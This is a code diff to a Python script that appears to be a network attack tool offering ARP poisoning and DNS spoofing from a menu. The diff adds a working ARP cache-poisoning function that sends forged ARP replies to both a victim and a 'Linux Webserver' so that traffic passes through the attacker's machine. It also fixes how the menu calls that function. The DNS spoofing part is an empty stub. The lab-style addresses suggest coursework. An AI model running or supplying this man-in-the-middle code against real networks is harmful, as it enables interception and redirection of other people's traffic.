@@ -5,9 +5,44 @@ import time
 import socket
 import nmap
 import os
+import sys
+from getmac import get_mac_address
 
 # Default variables
 Net_Interface = "eth0" 
+SERVER_IP = "192.168.56.102"
+SERVER_MAC = '08:00:27:CC:08:6F'
+ATTACKER_MAC = get_mac_address(interface=Net_Interface)
+
+def arp(VICTIM_MAC, VICTIM_IP):
+	print(ATTACKER_MAC)
+	
+		
+				
+	arp= Ether() / ARP()
+	arp[Ether].src = ATTACKER_MAC
+	arp[ARP].hwsrc = ATTACKER_MAC
+	arp[ARP].psrc = SERVER_IP
+	arp[ARP].hwdst = VICTIM_MAC
+	arp[ARP].pdst = VICTIM_IP
+
+	sendp(arp, iface=Net_Interface)
+
+	#Poison the Linux Webserver
+	arp= Ether() / ARP()
+	arp[Ether].src = ATTACKER_MAC
+	arp[ARP].hwsrc = ATTACKER_MAC
+	arp[ARP].psrc = VICTIM_IP
+	arp[ARP].hwdst = SERVER_MAC
+	arp[ARP].pdst = SERVER_IP
+
+	sendp(arp, iface=Net_Interface)
+
+	poisonedIPs = [VICTIM_IP, SERVER_IP]
+	print("(ARP) Re-poisoned the ARP of the following IPs: " + str(poisonedIPs));
+	time.sleep(14)
+    	
+	return
 
 print("Want to scan for all connected devices in the network? (Y/N)")
 choice = input()
@@ -40,19 +75,17 @@ print("2:	DNS Spoofing")
 print("3:	ARP Poisoning & DNS Spoofing \n \n")
 attack_to_perform = input()
 
-if attack_to_perform == 1:
-	arp()
-	print("arp")
-elif attack_to_perform == 2:
+if attack_to_perform == "1":
+	arp(VICTIM_MAC, VICTIM_IP)
+	
+elif attack_to_perform == "2":
 	dns()
-	print("dns")
-elif attack_to_perform == 3:
-	arp()
+	
+elif attack_to_perform == "3":
+	arp(VICTIM_MAC, VICTIM_IP)
 	dns()
-	print("arp and dns")
 
-def arp():
-	print("arp")
+
 
 def dns():
 	return
